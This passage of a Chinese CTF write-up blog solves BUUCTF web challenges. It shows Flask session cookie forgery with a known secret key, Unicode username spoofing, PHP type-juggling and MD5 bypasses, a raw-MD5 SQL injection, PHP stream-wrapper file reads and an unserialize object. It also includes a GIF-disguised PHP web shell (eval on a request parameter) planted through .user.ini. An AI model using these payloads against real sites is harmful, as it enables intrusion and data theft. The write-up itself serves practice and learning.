class=\"keyword\">raise</span> Exception(<span class=\"string\">&#x27;Could not zlib decompress the payload before &#x27;</span></span><br><span class=\"line\">                             <span class=\"string\">&#x27;decoding the payload&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> session_json_serializer.loads(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(decryption(sys.argv[<span class=\"number\">1</span>].encode()))</span><br></pre></td></tr></table></figure>\n\n<p>执行命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python run.py .eJw90MGKwkAMBuBXWXL2YLvuRfAgjBaFpFRGh8lFdK1tpxOFqmwd8d131gVvIX_4SPKA7bErLzWMr92tHMC2OcD4AR97GIPVOKIU-zzDgI4bDAeP2cZhWAcSO0SzcpiuhM26R1OMYi8h4faVSZGyniYYqk8y7FgdmlzFOV1LrufCat6gxpSikRu8WzMLrNqE1CJFXYzYRMmwZ-HahmXNGTkKi7sNbUpq6aP_xcpLrthbZyfwHMD3pTtur-e2PL1PyP_IUAWKS1uZ9Si2JzP3nLGg4NA6TMjYH9bexbonXXsuJi-ukV1VvqVi4xer6X9y2kkMoLqd97tTBQO4Xcru9TlIhvD8BSJwb7A.YELi9g.D_opOsSTFKn3wKeMF1rcGksx5HA</span><br></pre></td></tr></table></figure>\n\n<p>结果</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;a387c18c326b37e0ec3536f41dc3dfee11d86f56fd6f42d6e053875fcd7b85118f91fd1b1365dc9c2aa3d95426148ecfefeffac2adcc722c9642e2d9d9f86eb6&#x27;, &#x27;csrf_token&#x27;: b&#x27;895783633ba12f15aedff2c4b355f0e9cb3158ee&#x27;, &#x27;image&#x27;: b&#x27;AYHD&#x27;, &#x27;name&#x27;: &#x27;guobang&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>然后我们需要吧<code>name</code>的值修改为<code>admin</code>。修改完成以后还需要回到原来的session格式，那么就需要用到一个加密flask的工具：<a href=\"https://github.com/noraj/flask-session-cookie-manager\">flask-session-cookie-manager</a></p>\n<blockquote>\n<p>这个工具也可以用来解密。我整理的使用方法如下，记得要用双引号<code>&quot;&quot;</code>括起来</p>\n<p>python flask_session_cookie_manager{2,3}.py {encode,decode}</p>\n<p>-s “SECRET_KEY”                        都需要使用<br>-c “Session cookie value”                session的值      只有解密decode用得到<br>-t “Session cookie structure”          cookie结构    只有encode用得</p>\n</blockquote>\n<p>执行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python flask_session_cookie_manager3.py encode -s &quot;ckj123&quot; -t &quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;a387c18c326b37e0ec3536f41dc3dfee11d86f56fd6f42d6e053875fcd7b85118f91fd1b1365dc9c2aa3d95426148ecfefeffac2adcc722c9642e2d9d9f86eb6&#x27;, &#x27;csrf_token&#x27;: b&#x27;895783633ba12f15aedff2c4b355f0e9cb3158ee&#x27;, &#x27;image&#x27;: b&#x27;AYHD&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;&quot;</span><br></pre></td></tr></table></figure>\n\n<p>得到</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.eJw90MGKwkAMBuBXWXL2YLvdi-BBGC0KSamMDpOLuNtqO524UJWtI777zrrgLeQPH0nusDv09bmByaW_1iPYtRVM7vD2CROwGjNKcShyDOi4xVB5zLcOwyaQ2DGatcN0LWw2A5oyi72EhLtnJmXKepZgOL6TYceqagsV53QjhV4Iq0WLGlOKRmHwZs08sOoSUssUdZmxiZJhz8KNDauGc3IUljcbupTUykf_g5WXQrG3zk7hMYKvc3_YXb67-vQ6ofgjwzFQXNrKfECxA5mF55wFBcfWYULG_rD2LtYD6cZzOX1yreyP9Usqt365nv0np73EAPaVtCcYwfVc98-_QTKGxy8-U27W.YELpfA.vD1SVCAxOcwOPXc_DbwFqJT1TRg</span><br></pre></td></tr></table></figure>\n\n<p>放在请求头中，格式为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cookie: session=加密内容</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210306103214.png\"></p>\n<h2 id=\"解法二：Unicode欺骗\"><a href=\"#解法二：Unicode欺骗\" class=\"headerlink\" title=\"解法二：Unicode欺骗\"></a>解法二：Unicode欺骗</h2><p>第二种方法是利用代码中的strlower()函数的使用不当。这个函数分别在注册、登陆、修改密码的地方出现三次。这个方法的思路就是unicode加密三层，在最后一层修改密码时执行函数strlower()后修改到admin的密码。过程为</p>\n<blockquote>\n<p>ᴬᴰᴹᴵᴺ——注册后——&gt;ADMIN—修改密码—&gt;admin</p>\n</blockquote>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ᴬᴰᴹᴵᴺ</span><br></pre></td></tr></table></figure>\n\n<p>注册以后使用<code>ᴬᴰᴹᴵᴺ</code>登陆，然后修改密码时实际修改的就是admin的密码了，然后登陆admin即可。</p>\n<hr>\n<h1 id=\"极客大挑战-2019-BuyFlag\"><a href=\"#极客大挑战-2019-BuyFlag\" class=\"headerlink\" title=\"[极客大挑战 2019]BuyFlag\"></a>[极客大挑战 2019]BuyFlag</h1><p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121104213.png\">网站题直接去看源码，在源码也搜索php有两个：index.php、pay.php。前者是首页，直接看后面的那个，打开就有提示</p>\n<blockquote>\n<p>Only Cuit’s students can buy the FLAG</p>\n</blockquote>\n<p>应该还是一道http的套娃题。查看网页的请求发现Cookie中有一个user=0，很可疑，改成user=1，有了下一个提示：输入密码，并且源码中有一段php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!--</span><br><span class=\"line\">\t~~~post money and password~~~</span><br><span class=\"line\">if (isset($_POST[&#x27;password&#x27;])) &#123;</span><br><span class=\"line\">\t$password = $_POST[&#x27;password&#x27;];</span><br><span class=\"line\">\tif (is_numeric($password)) &#123;</span><br><span class=\"line\">\t\techo &quot;password can&#x27;t be number&lt;/br&gt;&quot;;</span><br><span class=\"line\">\t&#125;elseif ($password == 404) &#123;</span><br><span class=\"line\">\t\techo &quot;Password Right!&lt;/br&gt;&quot;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>还记得php<code>==</code>关系运算会强制转换类型，用POST传一个password=404a，<code>404a</code>会被强制转换为<code>404</code>，密码就对上了。接下来是钱的问题，flag需要<strong>100000000</strong>块钱我们也去要传过去。如果直接传入这么长的会提示字符串过长，所以我想到了科学计数法，<code>10e10</code>，就是10的10次方，通过。最终的请求：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /pay.php HTTP/1.1</span><br><span class=\"line\">Host: 268f365e-648d-477c-ba25-0c56572cc31f.node3.buuoj.cn</span><br><span class=\"line\">Content-Length: 25</span><br><span class=\"line\">Cache-Control: max-age=0</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">Origin: http://268f365e-648d-477c-ba25-0c56572cc31f.node3.buuoj.cn</span><br><span class=\"line\">Content-Type: application/x-www-form-urlencoded</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class=\"line\">Referer: http://268f365e-648d-477c-ba25-0c56572cc31f.node3.buuoj.cn/pay.php</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.9</span><br><span class=\"line\">Cookie: user=1</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\"></span><br><span class=\"line\">password=404a&amp;money=10e10</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h1 id=\"SUCTF-2019-CheckIn\"><a href=\"#SUCTF-2019-CheckIn\" class=\"headerlink\" title=\"[SUCTF 2019]CheckIn\"></a>[SUCTF 2019]CheckIn</h1><p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210201103750.png\"></p>\n<p>知识点</p>\n<blockquote>\n<p>.user.ini。它比.htaccess用的更广，不管是nginx/apache/IIS，只要是以fastcgi运行的php都可以用这个方法。可谓很广，不像.htaccess有局限性，只能是apache.</p>\n</blockquote>\n<p>准备好.user.ini文件内容为自动包含图片马，因为上传会检查文件头，所以添加了一个GIF文件头伪装：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GIF89a</span><br><span class=\"line\">auto_prepend_file=233.gif</span><br></pre></td></tr></table></figure>\n\n<p>接下来上传图片马，尝试了正常上传PHP马会提示：</p>\n<blockquote>\n<? in contents!\n</blockquote>\n<p>所以使用script马执行php：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GIF89a</span><br><span class=\"line\">&lt;script language=&quot;php&quot;&gt;eval($_REQUEST[shell])&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n\n<p>上传成功后会提示文件路径：</p>\n<blockquote>\n<p>Your dir uploads/852aff287f54bca0ed7757a702913e50<br>Your files :<br>array(5) { [0]=&gt; string(1) “.” [1]=&gt; string(2) “..” [2]=&gt; string(9) “.user.ini” [3]=&gt; string(7) “233.gif” [4]=&gt; string(9) “index.php” }</p>\n</blockquote>\n<p>这时候.user.ini文件已经会帮我们自动包含图片马了，所以我们只需要访问一个PHP文件即可，正好上传目录下有一个index.php文件，可以直接蚁剑连接或者POST请求system(‘cat /flag’)。</p>\n<hr>\n<h1 id=\"BJDCTF2020-Easy-MD5\"><a href=\"#BJDCTF2020-Easy-MD5\" class=\"headerlink\" title=\"[BJDCTF2020]Easy MD5\"></a>[BJDCTF2020]Easy MD5</h1><p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210201105021.png\"></p>\n<p>参考：</p>\n<blockquote>\n<p><a href=\"'https://www.jianshu.com/p/12125291f50d\">【Jarvis OJ】Login–password=’”.md5($pass,true).”</a></p>\n<p><a href=\"https://blog.csdn.net/March97/article/details/81222922\">sql注入：md5($password,true)</a></p>\n<p><a href=\"http://mslc.ctf.su/wp/leet-more-2010-oh-those-admins-writeup/\">Leet More 2010 Oh Those Admins! writeup</a></p>\n</blockquote>\n<p>随便输入一些东西都没有反应，在请求头中发现了一个Hint：</p>\n<blockquote>\n<p>select * from ‘admin’ where password=md5($pass,true)</p>\n</blockquote>\n<p><strong>语法</strong></p>\n<p><strong>md5(string,raw)</strong></p>\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>string</td>\n<td>必需。要计算的字符串。</td>\n</tr>\n<tr>\n<td>raw</td>\n<td>可选。默认不写为FALSE。32位16进制的字符串TRUE。16位原始二进制格式的字符串</td>\n</tr>\n</tbody></table>\n<p>概括理解，这里如果raw参数为<code>true</code>的话，这个函数的返回值是<code>string</code>的md5加密值进行十六进制解码的字符串。这道题我当时是直接看了源码跳过了第一层，第一层的答案其实是<code>ffifdyop</code>，我们来对它进行一波操作</p>\n<ul>\n<li><p>源字符串：ffifdyop</p>\n</li>\n<li><p>md5加密值：276f722736c95d99e921722cf9ed621c</p>\n</li>\n<li><p>hex解码：’or’6É].é!r,ùíb.</p>\n</li>\n</ul>\n<p>最后那几个应该是不可见字符，重要的是前面一段：<code>&#39;or&#39;6</code>，这里还要说明一下，这提示应该不算严谨，真正的sql语句应该是在md5函数前后各一个<code>&#39;</code>单引号。执行以后真正的sql语句为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select * from &#x27;admin&#x27; where password=&#x27;&#x27;or&#x27;6É].é!r,ùíb.‘</span><br></pre></td></tr></table></figure>\n\n<p>可以看到原理是构成一个闭合，这里还有第二个知识点，是or后面的字符串被认为是true，引用文章里的一段：</p>\n<blockquote>\n<p>a string starting with a <code>1</code> is cast as an integer when used as a boolean.</p>\n<p>在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数。要注意的是这种情况是必须要有单引号括起来的，比如password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password=‘xxx’ or 1 ，也就相当于password=‘xxx’ or true，所以返回值就是true。当然在我后来测试中发现，不只是1开头，只要是数字开头都是可以的。</p>\n</blockquote>\n<p>自己进行的测试：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210201113825.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210201113839.png\"></p>\n<p>所以真正的解法是只要sql语句的格式为password=’xxxxxxxx’ or ‘1xxxx’，即hex包含字符串”276f722731”（’or’1），其实or后面开头只要是数字即可，1-9的hex范围为31-39。</p>\n<p>下面这个程序是这道题开头参考列表中的第三个链接。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php </span><br><span class=\"line\">for ($i = 0;;) &#123; </span><br><span class=\"line\"> for ($c = 0; $c &lt; 1000000; $c++, $i++)</span><br><span class=\"line\">  if (stripos(md5($i, true), &#x27;\\&#x27;or\\&#x27;&#x27;) !== false)</span><br><span class=\"line\">   echo &quot;\\nmd5($i) = &quot; . md5($i, true) . &quot;\\n&quot;;</span><br><span class=\"line\"> echo &quot;.&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>这个程序遍历数字进行md5加密，使用stripos匹配是否有<code>&#39;or&#39;</code>，这个函数有一个弊病就是如果是以<code>&#39;or&#39;</code>开头的不会匹配到，并且我们需要的是or后面以数字开头都可以，所以需要稍微做一些修改，使用正则表达式由<code>\\&#39;or\\&#39;</code>改为<code>&#39;or&#39;([1-9]+|0+[1-9])</code><span class=\"heimu\"> 不过我的方法自己还没跑出来🤣，回头加个多线程试一试</span></p>\n<p>（更新）</p>\n<p>自己写了一个python程序，放在学生服务器上跑了一个下午加一个晚上，出了两个答案，好家伙从1跑到52亿：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210203094304.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">找到了md5(2413633098): </span><br><span class=\"line\">找到了md5(5207660362): </span><br><span class=\"line\">找到了md5(8351555222): </span><br><span class=\"line\">找到了md5(13095770027): </span><br><span class=\"line\">找到了md5(14860117901): </span><br><span class=\"line\">找到了md5(15724086109): </span><br><span class=\"line\">找到了md5(16529176061): </span><br><span class=\"line\">找到了md5(17428338265): </span><br><span class=\"line\">找到了md5(18717303578):</span><br><span class=\"line\">找到了md5(19342380396): </span><br><span class=\"line\">找到了md5(23960028257): </span><br><span class=\"line\">找到了md5(32561902614): </span><br><span class=\"line\">找到了md5(38983153698): </span><br><span class=\"line\">找到了md5(39742292223): </span><br><span class=\"line\">找到了md5(44120894060): </span><br><span class=\"line\">找到了md5(44820604888): </span><br><span class=\"line\">找到了md5(45570673322): </span><br><span class=\"line\">找到了md5(45855250502): </span><br><span class=\"line\">找到了md5(53660569009): </span><br><span class=\"line\">找到了md5(55098175010): </span><br><span class=\"line\">找到了md5(59763304323): </span><br><span class=\"line\">找到了md5(60185044906): </span><br><span class=\"line\">找到了md5(68625783421): </span><br><span class=\"line\">找到了md5(70949326264): </span><br><span class=\"line\">(md5值删了，因为乱码会影响博客的搜索功能)</span><br></pre></td></tr></table></figure>\n\n<p>程序源码如下（自己写着玩，轻喷）：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># codeing = utf-8</span><br><span class=\"line\"></span><br><span class=\"line\">import threading</span><br><span class=\"line\">import hashlib</span><br><span class=\"line\">import re</span><br><span class=\"line\">import itertools</span><br><span class=\"line\">import time</span><br><span class=\"line\"># r&#x27;\\&#x27;or\\&#x27;([1-9]+|0+[1-9])&#x27;</span><br><span class=\"line\"># r&#x27;\\&#x27;or\\&#x27;&#x27;</span><br><span class=\"line\">pattern=re.compile(r&#x27;\\&#x27;or\\&#x27;([1-9]+|0+[1-9])&#x27;,re.I)</span><br><span class=\"line\">item = itertools.count(1)</span><br><span class=\"line\"></span><br><span class=\"line\">def thrfunc():</span><br><span class=\"line\">    while 1:</span><br><span class=\"line\">        s2 = &#x27;&#x27;</span><br><span class=\"line\">        temp = str(next(item))</span><br><span class=\"line\">        s1 = hashlib.md5(temp.encode(encoding=&#x27;UTF-8&#x27;)).hexdigest()</span><br><span class=\"line\">        for i in range(0, len(s1), 2):</span><br><span class=\"line\">            s2 = s2 + chr(int(s1[i:i + 2], 16))</span><br><span class=\"line\">        if re.search(pattern, s2):</span><br><span class=\"line\">            print(&quot;找到了md5(&quot; + temp + &quot;): &quot; + s2)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">threads=[]</span><br><span class=\"line\">for i in range(10):</span><br><span class=\"line\">    t = threading.Thread(target=thrfunc)</span><br><span class=\"line\">    threads.append(t)</span><br><span class=\"line\">    t.start()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>虽然不知道多整几个能用的值可以干什么，但是觉得自己写的程序跑出来答案就很爽🤣。</p>\n<p>还有一个能用的md5值：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">content: 129581926211651571912466741651878684928</span><br><span class=\"line\">hex: 06da5430449f8f6f23dfc1276f722738</span><br><span class=\"line\">raw: \\x06\\xdaT0D\\x9f\\x8fo#\\xdf\\xc1&#x27;or&#x27;8</span><br><span class=\"line\">string: T0Do#&#x27;or&#x27;8</span><br></pre></td></tr></table></figure>\n\n<p>以上是第一层。<strong>其实看了源码里只验证了字符串是否等于<code>ffifdyop</code>我写的脚本里的值肯定通过不了</strong></p>\n<p>第二层可以直接在源码中看到注释。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$a = $GET[&#x27;a&#x27;];</span><br><span class=\"line\">$b = $_GET[&#x27;b&#x27;];</span><br><span class=\"line\"></span><br><span class=\"line\">if($a != $b &amp;&amp; md5($a) == md5($b))&#123;</span><br><span class=\"line\">    // wow, glzjin wants a girl friend.</span><br></pre></td></tr></table></figure>\n\n<p>简单的md5以0E开头</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a=QNKCDZO&amp;b=240610708</span><br></pre></td></tr></table></figure>\n\n<p>第三层</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">include &quot;flag.php&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\">if($_POST[&#x27;param1&#x27;]!==$_POST[&#x27;param2&#x27;]&amp;&amp;md5($_POST[&#x27;param1&#x27;])===md5($_POST[&#x27;param2&#x27;]))&#123;</span><br><span class=\"line\">    echo $flag;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这一有一些不同的是md5比较使用了<code>===</code>不仅比较类型还比较值。但是md5有一个：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">md5([1,2,3]) == md5([4,5,6]) == NULL</span><br></pre></td></tr></table></figure>\n\n<p>所以传入两个数组，又能保证两个变量不相等，md5加密有都是NULL且类型是数组类型，注意数组里的值还是不可以一样的。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">param1[]=1&amp;param2[]=2</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h1 id=\"ZJCTF-2019-NiZhuanSiWei\"><a href=\"#ZJCTF-2019-NiZhuanSiWei\" class=\"headerlink\" title=\"[ZJCTF 2019]NiZhuanSiWei\"></a>[ZJCTF 2019]NiZhuanSiWei</h1><p>源码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php  </span><br><span class=\"line\">$text = $_GET[&quot;text&quot;];</span><br><span class=\"line\">$file = $_GET[&quot;file&quot;];</span><br><span class=\"line\">$password = $_GET[&quot;password&quot;];</span><br><span class=\"line\">if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123;</span><br><span class=\"line\">    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;</span><br><span class=\"line\">    if(preg_match(&quot;/flag/&quot;,$file))&#123;</span><br><span class=\"line\">        echo &quot;Not now!&quot;;</span><br><span class=\"line\">        exit(); </span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        include($file);  //useless.php</span><br><span class=\"line\">        $password = unserialize($password);</span><br><span class=\"line\">        echo $password;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else&#123;</span><br><span class=\"line\">    highlight_file(__FILE__);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>先来一段<a href=\"https://segmentfault.com/a/1190000018991087\">PHP伪协议总结</a>，这题的第一步是判断传入text参数并读取内容，判断内容为<strong>welcome to the zjctf</strong>，使用<code>data://</code>伪协议。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?text=data://text/plain,welcome to the zjctf</span><br></pre></td></tr></table></figure>\n\n<p>接下来是文件包含，有了提示<code>useless.php</code>肯定要读一读看看，使用<code>php://filter</code>伪协议。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?text=data://text/plain,welcome to the zjctf&amp;file=php://filter/convert.base64-encode/resource=useless.php</span><br></pre></td></tr></table></figure>\n\n<p>得到的内容</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php  </span><br><span class=\"line\"></span><br><span class=\"line\">class Flag&#123;  //flag.php  </span><br><span class=\"line\">    public $file;  </span><br><span class=\"line\">    public function __tostring()&#123;  </span><br><span class=\"line\">        if(isset($this-&gt;file))&#123;  </span><br><span class=\"line\">            echo file_get_contents($this-&gt;file); </span><br><span class=\"line\">            echo &quot;&lt;br&gt;&quot;;</span><br><span class=\"line\">        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">?&gt;  </span><br></pre></td></tr></table></figure>\n\n<p>并且文件包含下面有一个反序列化，又看到了<code>__tostring</code>函数，<strong>当一个对象被当作字符串对待的时候，会触发这个魔术方法</strong>。我构造的对象</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php </span><br><span class=\"line\">class Flag&#123;  </span><br><span class=\"line\">    public $file=&quot;flag.php&quot;;  </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$f = new Flag();</span><br><span class=\"line\">echo serialize($f);</span><br><span class=\"line\"></span><br><span 